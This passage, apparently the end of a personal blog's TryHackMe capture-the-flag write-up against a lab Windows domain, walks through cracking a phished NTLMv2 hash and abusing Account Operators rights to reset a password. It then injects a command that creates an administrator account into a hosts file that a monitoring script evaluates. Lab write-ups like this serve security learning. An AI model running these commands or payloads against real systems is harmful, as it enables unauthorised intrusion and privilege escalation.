+</code></pre><p>wait for buse to click the link&hellip;</p>
+<p><img src="/responder.png" alt="responder"></p>
+<p><img src="/sparkexploit.png" alt="sparkexploit"></p>
+<p>we receive a hash, in the NTLMv2 format. hopefully, we can crack it with hashcat (and rockyou.txt):</p>
+<pre tabindex="0"><code>hashcat.exe -a 0 -m 5600 &#34;buse::WINDCORP:1122334455667788:96320659CCC8CCD0C23852F82AA669C8:0101000000000000792F24210DCCD701CB9891E68DB963FB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000B25F9F074A7F2B076C71892C3D7F9B988260CA42BCBEB4E1863C7810B3FF276D0A00100000000000000000000000000000000000090000000000000000000000&#34; C:\rockyou.txt
+</code></pre><p>upon a successful crack, we&rsquo;ll get the password <code>uzunLM+3131</code>. great! now we have another set of credentials &ndash; buse:uzunLM+3131</p>
+<p>note: i do recommend saving found/cracked credentials in a text file. that way we&rsquo;re not constantly scrolling through terminal trying to find them.</p>
+<pre tabindex="0"><code>echo &#34;buse:uzunLM+3131&#34; &gt; creds.txt
+</code></pre><p>now we get to use one of my favourite tools ever: <a href="https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/">evil winrm</a>. if you don&rsquo;t know, evil winrm is basically the go-to tool, sometimes used by sysadmins but mostly by hackers, to remotely access a windows machine. it&rsquo;s extremely useful in the post-exploitation phase.</p>
+<pre tabindex="0"><code>evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
+</code></pre><p>this will log us in as buse, and upon poking around, you&rsquo;ll locate the 2nd flag.</p>
+<p>what&rsquo;s more interesting though, and which proves to eventually be vital in privilege escalation, is a folder in C:\ that contains a powershell script and its log.</p>
+<p><img src="/busescripts.png" alt="busescripts"></p>
+<p>the code for the checkservers.ps1 script is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># reset the lists of hosts prior to looping</span>
+</span></span><span style="display:flex;"><span>$OutageHosts = $Null
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the time you want email notifications resent for hosts that are down</span>
+</span></span><span style="display:flex;"><span>$EmailTimeOut = <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the time you want to cycle through your host lists.</span>
+</span></span><span style="display:flex;"><span>$SleepTimeOut = <span style="color:#ae81ff">45</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the maximum hosts that can be down before the script is aborted</span>
+</span></span><span style="display:flex;"><span>$MaxOutageCount = <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify who gets notified</span>
+</span></span><span style="display:flex;"><span>$notificationto = <span style="color:#e6db74">&#34;brittanycr@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify where the notifications come from</span>
+</span></span><span style="display:flex;"><span>$notificationfrom = <span style="color:#e6db74">&#34;admin@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the SMTP server</span>
+</span></span><span style="display:flex;"><span>$smtpserver = <span style="color:#e6db74">&#34;relay.windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># start looping here</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Do</span>{
+</span></span><span style="display:flex;"><span>$available = $Null
+</span></span><span style="display:flex;"><span>$notavailable = $Null
+</span></span><span style="display:flex;"><span>Write-Host (Get-Date)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># from the list without touching the script/scheduled task,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span>
+</span></span><span style="display:flex;"><span>get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;#&#34;</span>)} |
+</span></span><span style="display:flex;"><span>ForEach-Object {
+</span></span><span style="display:flex;"><span>    $p = <span style="color:#e6db74">&#34;Test-Connection -ComputerName </span>$_<span style="color:#e6db74"> -Count 1 -ea silentlycontinue&#34;</span>
+</span></span><span style="display:flex;"><span>    Invoke-Expression $p
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($p)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#75715e"># if the Host is available then just write it to the screen</span>
+</span></span><span style="display:flex;"><span>     write-host <span style="color:#e6db74">&#34;Available host ---&gt; &#34;</span>$_ -BackgroundColor Green -ForegroundColor White
+</span></span><span style="display:flex;"><span>     [<span style="color:#66d9ef">Array</span>]$available += $_
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#75715e"># If the host is unavailable, give a warning to screen</span>
+</span></span><span style="display:flex;"><span>     write-host <span style="color:#e6db74">&#34;Unavailable host ------------&gt; &#34;</span>$_ -BackgroundColor Magenta -ForegroundColor White
+</span></span><span style="display:flex;"><span>     $p = Test-Connection -ComputerName $_ -Count <span style="color:#ae81ff">1</span> -ea silentlycontinue
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span>(!($p))
+</span></span><span style="display:flex;"><span>       {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If the host is still unavailable for 4 full pings, write error and send email</span>
+</span></span><span style="display:flex;"><span>        write-host <span style="color:#e6db74">&#34;Unavailable host ------------&gt; &#34;</span>$_ -BackgroundColor Red -ForegroundColor White
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">Array</span>]$notavailable += $_
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($OutageHosts <span style="color:#f92672">-ne</span> $Null)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (!$OutageHosts.ContainsKey($_))
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                 <span style="color:#75715e"># First time down add to the list and send email</span>
+</span></span><span style="display:flex;"><span>                 Write-Host <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> Is not in the OutageHosts list, first time down&#34;</span>
+</span></span><span style="display:flex;"><span>                 $OutageHosts.Add($_,(get-date))
+</span></span><span style="display:flex;"><span>                 $Now = Get-date
+</span></span><span style="display:flex;"><span>                 $Body = <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> has not responded for 5 pings at </span>$Now<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                 Send-MailMessage -Body <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> -to $notificationto -from $notificationfrom `
+</span></span><span style="display:flex;"><span>                  -Subject <span style="color:#e6db74">&#34;Host </span>$_<span style="color:#e6db74"> is down&#34;</span> -SmtpServer $smtpserver
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># If the host is in the list do nothing for 1 hour and then remove from the list.</span>
+</span></span><span style="display:flex;"><span>                    Write-Host <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> Is in the OutageHosts list&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes <span style="color:#f92672">-gt</span> $EmailTimeOut)
+</span></span><span style="display:flex;"><span>                    {$OutageHosts.Remove($_)}
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># First time down create the list and send email</span>
+</span></span><span style="display:flex;"><span>                Write-Host <span style="color:#e6db74">&#34;Adding </span>$_<span style="color:#e6db74"> to OutageHosts.&#34;</span>
+</span></span><span style="display:flex;"><span>                $OutageHosts = @{$_=(get-date)}
+</span></span><span style="display:flex;"><span>                $Body = <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> has not responded for 5 pings at </span>$Now<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                Send-MailMessage -Body <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> -to $notificationto -from $notificationfrom `
+</span></span><span style="display:flex;"><span>                 -Subject <span style="color:#e6db74">&#34;Host </span>$_<span style="color:#e6db74"> is down&#34;</span> -SmtpServer $smtpserver
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Report to screen the details</span>
+</span></span><span style="display:flex;"><span>$log = <span style="color:#e6db74">&#34;Last run: </span>$(Get-Date)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>write-host $log
+</span></span><span style="display:flex;"><span>Set-Content -Path C:\scripts\log.txt -Value $log
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Available count:&#34;</span>$available.count
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Not available count:&#34;</span>$notavailable.count
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Not available hosts:&#34;</span>
+</span></span><span style="display:flex;"><span>$OutageHosts
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Sleeping </span>$SleepTimeOut<span style="color:#e6db74"> seconds&#34;</span>
+</span></span><span style="display:flex;"><span>sleep $SleepTimeOut
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($OutageHosts.Count <span style="color:#f92672">-gt</span> $MaxOutageCount)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># If there are more than a certain number of host down in an hour abort the script.</span>
+</span></span><span style="display:flex;"><span>    $Exit = $True
+</span></span><span style="display:flex;"><span>    $body = $OutageHosts | Out-String
+</span></span><span style="display:flex;"><span>    Send-MailMessage -Body <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> -to $notificationto -from $notificationfrom `
+</span></span><span style="display:flex;"><span>     -Subject <span style="color:#e6db74">&#34;More than </span>$MaxOutageCount<span style="color:#e6db74"> Hosts down, monitoring aborted&#34;</span> -SmtpServer $smtpServer
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ($Exit <span style="color:#f92672">-ne</span> $True)
+</span></span></code></pre></div><p>it looks like this code is checking the status of some hosts every 1 minute, from a file stored at <code>C:\Users\brittanycr\hosts.txt</code>.</p>
+<p>when we try to read brittanycr&rsquo;s directories, our access is denied.</p>
+<p><img src="/brittanycr.png" alt="brittanycr"></p>
+<p>if we run the command <code>whoami /groups</code> as buse, we&rsquo;ll see that buse is in the group &ldquo;account operators&rdquo;.</p>
+<p><img src="/whoamigroups.png" alt="whoamigroups"></p>
+<p>account operators can change passwords for other users, which means buse can change the password for brittanycr.</p>
+<pre tabindex="0"><code>net user brittanycr wEiRdP@$$W0rd1234! /domain
+</code></pre><p>(i chose this password because it complies with the password policy.)</p>
+<p>once the password has been changed, let&rsquo;s try to get that file at <code>C:\Users\brittanycr\hosts.txt</code>. since the checkservers.ps1 script reads from this file without being too annoying about checking what&rsquo;s in it, we&rsquo;re gonna inject a little bit of code into it and get the script to run it. this will be our ticket into getting root access.</p>
+<p>getting in:</p>
+<pre tabindex="0"><code>smbclient \\\\windcorp.thm\\Users -U brittanycr --password wEiRdP@$$W0rd1234!
+</code></pre><p>navigate to the folder above and download the hosts.txt file, then edit it to add the following bit of code:</p>
+<pre tabindex="0"><code>; net user bilal &#39;p*s$w0rd123&#39; /add; net localgroup Administrators bilal /add
+</code></pre><p><img src="/hosts.png" alt="hosts"></p>
+<p>when the script performs this little maneuver, it will inadvertently create a user &ldquo;bilal&rdquo;, and add me to the Administrators group heh heh.</p>
+<p>we have to replace the previous hosts.txt file with the new one. we can do this using the <code>upload</code> command in brittanycr&rsquo;s evil winrm instance.</p>
+<p>now if we navigate to buse&rsquo;s &ldquo;scripts&rdquo; folder, keep checking the log file to see if the script has been successfully run. it might be a bit of a wait, but if you&rsquo;re patient, you&rsquo;ll see the script will have run.</p>
+<p>we should now be able to access the network with our new (root) credentials.</p>
+<p><img src="/evilwinrmfail.png" alt="evilwinrmfail"></p>
+<p>hmmm, evil winrm is failing to log me in. maybe we can use another tool?</p>
+<p>first, i have to check if my credentials are actually root. to do this, let&rsquo;s use <a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/">crackmapexec</a>, a badass tool that quickly assesses the security of large AD networks. if it says we have access, i&rsquo;ll use psexec.py to log in.</p>
+<pre tabindex="0"><code>crackmapexec smb windcorp.thm -u bilal -p &#39;p*s$w0rd123&#39;
+
+python3 /usr/share/doc/python3-impacket/examples/psexec.py bilal@windcorp.thm
+</code></pre><p><img src="/pwned.png" alt="pwned"></p>
+<p>hell yeah, <em>we&rsquo;re in</em>.</p>
+<p><img src="/rootflag.png" alt="rootflag"></p>
+<p>that was a hell of a ride. from doing a bit of recon on the company&rsquo;s users, sending fake links to IT, getting their hash then password, then injecting our own malicious code into a routine script to get root&hellip;i guess WindCorp isn&rsquo;t unhackable after all :)</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        3028 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-11-10 16:37
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="/posts/2022/01/update/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">update</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="/posts/2021/10/tryhackme-overpass2/">
+                    <span class="button__text">tryhackme: overpass2</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.0931a358499291afca6f741478e9fc9fa973a9fbd7aeb3390f3b10463966dc8195daf98a0e33685a1fbfb9d7578631c3f31fc8e558eaf6e2c30c4c3e14df4931.js" integrity="sha512-CTGjWEmSka/Kb3QUeOn8n6lzqfvXrrM5DzsQRjlm3IGV2vmKDjNoWh&#43;/uddXhjHD8x/I5Vjq9uLDDEw&#43;FN9JMQ=="></script>
+
+
+
+    </body>
+</html>
